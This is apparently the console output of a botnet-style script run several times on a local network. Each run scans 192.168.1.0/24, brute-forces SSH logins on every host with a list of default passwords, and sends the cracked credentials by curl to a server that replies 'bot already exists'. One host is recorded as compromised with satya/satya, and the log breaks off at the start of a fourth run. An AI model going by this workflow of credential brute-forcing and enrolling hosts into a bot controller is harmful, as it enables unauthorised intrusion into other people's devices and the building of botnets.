192.168.1.
trying with 192.168.1..0/24


running the script for the 1 th time


Scanning the Network


Devices on the network
192.168.1.18
192.168.1.9
192.168.1.4
192.168.1.7
192.168.1.2
192.168.1.3


SSH attempt

Brute forcing the device with IP 192.168.1.18
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    77  100    18  100    59   1371   4495 --:--:-- --:--:-- --:--:--  4916
{
  "code": 200
}
192.168.1.18,satya,satya added


Brute forcing the device with IP 192.168.1.9
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.9



Brute forcing the device with IP 192.168.1.4
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.4



Brute forcing the device with IP 192.168.1.7
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.7



Brute forcing the device with IP 192.168.1.2
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.2



Brute forcing the device with IP 192.168.1.3
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.3



Completed!!
IP , User name , Passwords are
192.168.1.18,satya,satya
about to retart in few seconds




running the script for the 1 th time


Scanning the Network


Devices on the network
192.168.1.7
192.168.1.18
192.168.1.4
192.168.1.2
192.168.1.9
192.168.1.3


SSH attempt

Brute forcing the device with IP 192.168.1.7
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.7



Brute forcing the device with IP 192.168.1.18
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59   7234   8368 --:--:-- --:--:-- --:--:--  9833
{
  "code": 200, 
  "data": "bot already exists"
}
192.168.1.18,satya,satya added


Brute forcing the device with IP 192.168.1.4
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.4



Brute forcing the device with IP 192.168.1.2
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.2



Brute forcing the device with IP 192.168.1.9
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.9



Brute forcing the device with IP 192.168.1.3
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.3



Completed!!
IP , User name , Passwords are
192.168.1.18,satya,satya
about to retart in few seconds




running the script for the 1 th time


Scanning the Network


Devices on the network
192.168.1.18
192.168.1.9
192.168.1.4
192.168.1.2
192.168.1.7
192.168.1.3


SSH attempt

Brute forcing the device with IP 192.168.1.18
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   110  100    51  100    59   9891  11442 --:--:-- --:--:-- --:--:-- 11800
{
  "code": 200, 
  "data": "bot already exists"
}
192.168.1.18,satya,satya added


Brute forcing the device with IP 192.168.1.9
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.9



Brute forcing the device with IP 192.168.1.4
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.4



Brute forcing the device with IP 192.168.1.2
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.2



Brute forcing the device with IP 192.168.1.7
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.7



Brute forcing the device with IP 192.168.1.3
trying admin and 1111111.
trying admin and 1234.
trying admin and admin1234.
trying admin and 12345.
trying pi and 123456789.
trying admin and 54321.
trying satya and satya.
trying NA and NA.

user name and password not found for 192.168.1.3



Completed!!
IP , User name , Passwords are
192.168.1.18,satya,satya
about to retart in few seconds




running the script for the 1 th time


Scanning the Network


Devices on the network
